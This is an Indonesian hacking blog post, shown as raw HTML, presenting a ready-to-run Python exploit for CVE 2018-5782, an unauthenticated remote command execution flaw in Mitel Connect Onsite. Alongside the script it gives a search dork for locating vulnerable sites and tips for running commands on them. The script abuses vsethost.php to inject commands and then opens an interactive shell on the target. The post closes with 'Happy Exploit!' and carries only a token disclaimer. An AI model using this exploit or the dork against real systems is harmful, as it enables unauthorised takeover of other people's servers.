<!DOCTYPE html>
<html>
        <head>
                <title>
CVE 2018-5782: Mitel connect onsite 19.49.5200.0 RCE
		</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <link rel="shortcut icon" href="/favicon.ico?v=2">
                <link rel="preconnect" href="https://fonts.googleapis.com">
                <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                <link href="https://fonts.googleapis.com/css2?family=Azeret+Mono&display=swap" rel="stylesheet">
                <link href="/theme/bootstrap/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
                <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
                <link rel="stylesheet" href="/theme/css/style.css">
		<link rel="stylesheet" href="/theme/css/default.min.css">
		<link rel="stylesheet" href="/theme/css/nord.css">
		<!-- Google Adsense-->
		<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2149089797407520" crossorigin="anonymous"></script>

        </head>

<body style="background-color:#0e1111">
<div class="container p-3" id="zetmono">
<div class="navbar-nav">

        <small style="color:#80ED99;float:left;margin-top:13px;position:absolute" class="badge bg-dark" >cat *.md</small>
        <div class="nav-link ms-auto fas fa-bars fa-2x" href="#" id="dropdownMenuButton1" role="button" data-bs-toggle="dropdown" aria-expanded="false" style="color:#80ED99;float:right;"></div>

      <ul class="dropdown-menu dropdown-menu-end bg-dark p-3 " style="border-radius:10px" aria-labelledby="dropdownMenuButton1">
        <li><a class="bg-transparent dropdown-item" style="color:#80ED99;" href="/"><small>/Home</small></a></li>
        <li><a class="bg-transparent dropdown-item" style="color:#80ED99;"href="/blog"><small>/Blog</small></a></li>
        <li><a class="bg-transparent dropdown-item" style="color:#80ED99;" href="/about"><small>/About</small></a></li>
      </ul>

</div>
</div>

<div id="zetmono" class="container">


<img src="#" style="display:none">
<div class="text-white">
        <small class="text-secondary">05, Sep 2021 </small>
        <span style="text-decoration:none;color:white"><h2><b>CVE 2018-5782: Mitel connect onsite 19.49.5200.0 RCE</b></h2></span>
        <a href="/tag/hacking"><small class="badge bg-dark" style="color:white">hacking</small></a>
</div><br>

<div class="text-white">
<p>Sebuah bug yang sudah berkarat, tapi masih saya sukai.
Oke pada kelemahan ini memungkinkan kamu bisa melakukan perintah shell (RCE)
tanpa otenkasi (Unauthenticated). beberapa dari situs yang rentan pada bug
ini tidak writable menggunakan wget / curl. gunakan "echo" sebagai gantinya.
<br><br>
Dork: +"Public" +"My Conferences" +"Personal Library" +"My Profile"
<br><br>
Perlu diingat ini hanya untuk sebatas pengetahuan, jangan sampai ngerugiin orang :)</p>
<p>Exploit Script</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">readline</span>
<span class="k">def</span> <span class="nf">build_shoretel</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
        <span class="n">obj</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s2">&quot;hostId&quot;</span><span class="p">:</span> <span class="s2">&quot;system&quot;</span><span class="p">,</span>
                <span class="s2">&quot;keyCode&quot;</span><span class="p">:</span> <span class="s2">&quot;base64_decode&quot;</span><span class="p">,</span>
                <span class="s2">&quot;meetingType&quot;</span><span class="p">:</span> <span class="s2">&quot;{$</span><span class="si">{gKeyCode}</span><span class="s2">($gSessionDir)}&quot;</span><span class="p">,</span>
                <span class="s2">&quot;sessionDir&quot;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&quot;utf-8&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;ascii&quot;</span><span class="p">),</span>
                <span class="s2">&quot;swfServer&quot;</span><span class="p">:</span> <span class="s2">&quot;{$</span><span class="si">{gHostID}</span><span class="s2">($gMeetingType)}&quot;</span><span class="p">,</span>
                <span class="s2">&quot;server&quot;</span><span class="p">:</span> <span class="s2">&quot;exec&quot;</span><span class="p">,</span>
                <span class="s2">&quot;dir&quot;</span><span class="p">:</span> <span class="s2">&quot;/usr/share/apache2/htdocs/wc2_deploy/scripts/&quot;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">obj</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s2">&quot;python filename.py &lt;site&gt;&quot;</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;/scripts/vsethost.php&quot;</span><span class="p">,</span><span class="n">params</span> <span class="o">=</span> <span class="n">build_shoretel</span><span class="p">(</span><span class="s2">&quot;echo bWVua3JlcDEzMzcK&quot;</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;/scripts/vmhost.php&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;bWVua3JlcDEzMzcK&quot;</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Target VULN..!!!&quot;</span><span class="p">)</span>
                <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
                        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;SYSTEM: ~$ &quot;</span><span class="p">)</span>
                        <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;/scripts/vsethost.php&quot;</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="n">build_shoretel</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
                        <span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;/scripts/vmhost.php&quot;</span><span class="p">)</span>
                        <span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">text</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span> <span class="k">else</span> <span class="s2">&quot;No output&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] Not Vuln&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
   <span class="n">exploit</span><span class="p">()</span>
</code></pre></div>

<p>Happy Exploit!</p>
</div>
</div>

<div id="zetmono" class="container">
</div>



<br><br>
<div class="footer text-secondary text-center " style="margin-top:auto;background:transparent">
        <div class="col-lg-12 p-3">
        <div class="row copyright">
            <div class="col-lg-12">
                <p style="font-size:10px">&copy; 2021 Hikode <br>Made with <i class="fa fa-heart"></i> & <i class="fa fa-coffee"></i> </p>
            </div>
        </div>
       </div>
</div>
    <script src="/theme/jquery/jquery.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
    <script src="/theme/bootstrap/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <script src="/theme/popper/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="/theme/js/highlight.min.js"></script>
	<script>hljs.highlightAll();</script>

</body>
</html>